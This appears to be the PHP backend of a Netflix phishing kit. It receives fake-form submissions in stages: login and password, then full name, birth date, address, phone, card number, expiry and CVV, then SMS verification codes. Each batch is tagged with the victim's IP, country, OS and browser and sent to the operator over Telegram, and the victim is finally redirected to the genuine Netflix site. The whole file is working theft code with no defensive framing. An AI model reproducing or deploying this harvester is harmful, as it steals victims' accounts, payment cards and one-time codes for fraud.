<?php



include_once '../inc/app.php';

$to = '';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {


	
	
		    if ($_POST['type'] == "login") {	
			
			$message .= '/----Netflix--Login---/' . "\r\n";
			$message .= 'Log : ' . $_POST['userLoginId'] . "\r\n";
			$message .= 'Pass : ' . $_POST['password'] . "\r\n";
            
            $message .= '/---------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            session_destroy();
            header("location: loading.htm");

       

    }
	
	
	
	    if ($_POST['type'] == "infos") {	
			
			$message .= '/----Netflix--Card---/' . "\r\n";
			$message .= 'Full name : ' . $_POST['firstName'] . "\r\n";
			$message .= 'Date de naissance : ' . $_POST['dob'] . "\r\n";
			$message .= 'Adresse : ' . $_POST['add'] . "\r\n";
			$message .= 'Zip : ' . $_POST['zip'] . "\r\n";
			$message .= 'Phone : ' . $_POST['billing'] . "\r\n";
			$message .= 'Numero de carte : ' . $_POST['creditCardNumber'] . "\r\n";
			$message .= 'Expiration : ' . $_POST['creditExpirationMonth'] . "\r\n";
			$message .= 'CVV : ' . $_POST['creditCardSecurityCode'] . "\r\n";
            
            $message .= '/---------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            session_destroy();
            header("location: load.htm");

       

    }
	

    if ($_POST['type'] == "sms") {
			
			$message .= '/----Netflix--SMS---/' . "\r\n";
			$message .= 'SMS : ' . $_POST['sms1'] . "\r\n";
            
            $message .= '/---------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            session_destroy();
            header("location: sms2.htm");

       

    }
	
	
	    if ($_POST['type'] == "code") {
			
			$message .= '/----Netflix--SMS2---/' . "\r\n";
			$message .= 'SMS Error : ' . $_POST['sms2'] . "\r\n";
            
            $message .= '/---------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			telegram_send(urlencode($message));
            session_destroy();
            header("location: https://www.netflix.com/browse");

       

    }
	
	

	
	
	

}

?>